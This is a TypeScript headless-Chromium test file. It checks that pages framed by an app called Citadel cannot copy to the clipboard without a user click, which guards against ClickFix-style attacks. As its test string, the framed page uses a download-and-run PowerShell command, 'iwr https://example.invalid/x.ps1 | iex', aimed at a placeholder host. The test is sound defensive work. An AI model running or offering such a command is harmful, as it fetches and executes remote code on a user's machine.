// A framed page can't put text on the clipboard without a click (#1086): Windows Defender's ClickFix check
// (SuspClip.B) fires on any copy of a download-and-run command, and a framed app or a minion's page that
// copied on its own while Citadel was open would raise it with no one touching anything. In a real browser
// (headless Chromium, test/browser.ts): Citadel's page frames a page from another origin the way it frames
// a contraption (frames.js) and an artifact (artifacts.js); on its own the framed page can't copy at all, and
// a Copy button in it still copies the old way (execCommand inside the click), as the kit's mockkit.js does.
// An app whose citadel-app.json asks for `"clipboard": "write"` is the control: its writeText goes through.
import assert from 'node:assert/strict';
import { after, before, test } from 'node:test';
import { ARTIFACT_ALLOW, ARTIFACT_SANDBOX, FRAME_ALLOW, frameAllow } from '../public/frames.js';
import { chromium, launch, serve, waitFor, type App, type Browser, type Page, skipMessage } from './browser.ts';

const bin = chromium();
const skip = !bin && skipMessage;

/** The framed page: tries both ways of copying at load, and copies the old way when its button is clicked. */
const INNER = `<!doctype html><meta charset="utf-8">
<button id="copy" style="position:fixed;inset:0">Copy</button>
<script>
  const say = (what) => parent.postMessage({ name: name, ...what }, '*');
  function oldWay(text) {
    const t = document.createElement('textarea');
    t.value = text;
    document.body.append(t);
    t.select();
    const ok = document.execCommand('copy');
    t.remove();
    return ok;
  }
  addEventListener('copy', () => say({ copyEvent: true }));
  addEventListener('message', async (e) => {
    if (e.data !== 'try') return;
    const api = await navigator.clipboard.writeText('iwr https://example.invalid/x.ps1 | iex').then(() => 'ok', (err) => err.name + ': ' + err.message);
    say({ api, old: oldWay('no click') });
  });
  // As Citadel UI's copyText (ui/markdown.js) does: writeText first, and the old way once that's refused, still in the click.
  document.getElementById('copy').onclick = async () => {
    const api = await navigator.clipboard.writeText('clicked').then(() => true, () => false);
    say({ clicked: api || oldWay('clicked') });
  };
  say({ loaded: true });
</script>`;

/** Citadel's side: one frame per way it frames a page, each named so the framed page can say which it is. */
const outer = (inner: string) => `<!doctype html><meta charset="utf-8">
<style>iframe{width:300px;height:120px;border:0;display:block}</style>
<iframe name="app" src="${inner}" allow="${FRAME_ALLOW}"></iframe>
<iframe name="artifact" src="${inner}" sandbox="${ARTIFACT_SANDBOX}" allow="${ARTIFACT_ALLOW}"></iframe>
<iframe name="optedIn" src="${inner}" allow="${frameAllow(true)}"></iframe>
<script>
  window.said = {};
  addEventListener('message', (e) => { const { name, ...rest } = e.data; said[name] = { ...said[name], ...rest }; });
  window.tryIn = (name) => { document.querySelector('iframe[name=' + name + ']').focus(); frames[name].postMessage('try', '*'); };
  window.ready = true;
</script>`;

let citadel: App;
let other: App;
let browser: Browser;
let page: Page;

before(async () => {
  if (skip) return;
  other = await serve((_path, res) => res.writeHead(200, { 'content-type': 'text/html' }).end(INNER));
  citadel = await serve((_path, res) => res.writeHead(200, { 'content-type': 'text/html' }).end(outer(other.base)));
  assert.notEqual(new URL(other.base).origin, new URL(citadel.base).origin, 'the framed page is on another origin, as an app or artifact is');
  browser = await launch(bin!);
  page = await browser.page(citadel.base, { width: 400, height: 500 });
  await waitFor(page, 'all three frames to load', `['app', 'artifact', 'optedIn'].every((n) => said[n]?.loaded)`);
});

after(async () => {
  await browser?.close();
  await other?.close();
  await citadel?.close();
});

async function tryIn(name: string) {
  await page.eval(`tryIn(${JSON.stringify(name)})`);
  await waitFor(page, `${name} to try copying`, `said.${name}.api !== undefined`);
  return page.eval<{ api: string; old: boolean; copyEvent?: boolean }>(`said.${name}`);
}

async function click(name: string) {
  const { x, y } = await page.centre(`iframe[name=${name}]`);
  for (const type of ['mousePressed', 'mouseReleased']) await page.send('Input.dispatchMouseEvent', { type, x, y, button: 'left', clickCount: 1 });
  await waitFor(page, `${name}'s click to copy`, `said.${name}.clicked !== undefined`);
  return page.eval<{ clicked: boolean; copyEvent?: boolean }>(`said.${name}`);
}

for (const name of ['app', 'artifact']) {
  test(`${name} frame: nothing copies without a click, and a Copy button still copies`, { skip }, async () => {
    const before = await tryIn(name);
    assert.match(before.api, /^NotAllowedError.*permissions policy/i, "writeText is refused by the frame's allow, focused or not");
    assert.equal(before.old, false, 'execCommand copy is refused with no click');
    assert.equal(before.copyEvent, undefined, 'no copy happened');
    const after = await click(name);
    assert.equal(after.clicked, true, "a click's copy goes through the old way, after writeText is refused (copyText's fallback)");
    assert.equal(after.copyEvent, true);
  });
}

// Chrome checks the frame's \`allow\` first and the site's clipboard permission second; a person's Chrome grants that
// to the page in front of them, so getting past the first check is a copy with no click. Headless Chromium has no one
// to grant it (Browser.grantPermissions didn't hold steady here), so these tests read which check said no.
test('an app that opts in gets past the frame check (the control)', { skip }, async () => {
  const { api } = await tryIn('optedIn');
  assert.doesNotMatch(api, /permissions policy/i, 'with clipboard-write allowed, only the site permission stands between a focused frame and a no-click copy');
});
